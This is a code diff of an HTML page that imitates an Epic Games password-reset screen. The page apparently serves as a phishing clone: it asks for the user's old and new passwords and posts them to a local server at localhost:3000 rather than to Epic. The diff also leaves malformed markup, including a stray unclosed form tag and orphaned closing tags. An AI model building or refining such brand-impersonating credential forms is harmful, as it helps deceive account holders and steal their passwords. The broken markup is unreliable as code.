@@ -142,39 +142,38 @@
         <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
             Enter your new password for your Epic Games account.
         </div>
-        <form action="http://localhost:3000/reset-password" method="POST">
-    <label for="oldPassword">Old Password:</label>
-    <input type="password" id="oldPassword" name="oldPassword" required><br>
+        <form
+</form><form action="http://localhost:3000/reset-password" method="POST">
+    <!-- Old Password Section -->
+    <div class="form-group">
+        <label for="oldPassword">Old Password</label>
+        <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
+        <span class="show-password" onclick="togglePassword('oldPassword')">👁</span>
+    </div>
 
-    <label for="newPassword">New Password:</label>
-    <input type="password" id="newPassword" name="newPassword" required><br>
+    <!-- New Password Section -->
+    <div class="form-group">
+        <label for="newPassword">New Password</label>
+        <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
+        <span class="show-password" onclick="togglePassword('newPassword')">👁</span>
+    </div>
 
-    <input type="submit" value="Submit">
+    <!-- Password Requirements -->
+    <div class="requirements">
+        <strong>Password Requirements:</strong>
+        <ul>
+            <li>Must not use any of your last 5 passwords</li>
+            <li>Must contain at least 7 characters</li>
+            <li>Must include at least 1 letter</li>
+            <li>Must include at least 1 number</li>
+            <li>Must not contain spaces</li>
+        </ul>
+    </div>
+
+    <!-- Submit Button -->
+    <button type="submit" class="submit-btn">Reset Password</button>
 </form>
 
-            <!-- Old Password Section -->
-            <div class="form-group">
-                <label for="oldPassword">Old Password</label>
-                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password">
-                <span class="show-password" onclick="togglePassword('oldPassword')">👁</span>
-            </div>
-
-            <!-- New Password Section -->
-            <div class="form-group">
-                <label for="newPassword">New Password</label>
-                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password">
-                <span class="show-password" onclick="togglePassword('newPassword')">👁</span>
-            </div>
-
-            <!-- Password Requirements -->
-            <div class="requirements">
-                <strong>Password Requirements:</strong>
-                <ul>
-                    <li>Must not use any of your last 5 passwords</li>
-                    <li>Must contain at least 7 characters</li>
-                    <li>Must include at least 1 letter</li>
-                    <li>Must include at least 1 number</li>
-                    <li>Must not contain spaces</li>
                 </ul>
             </div>
 
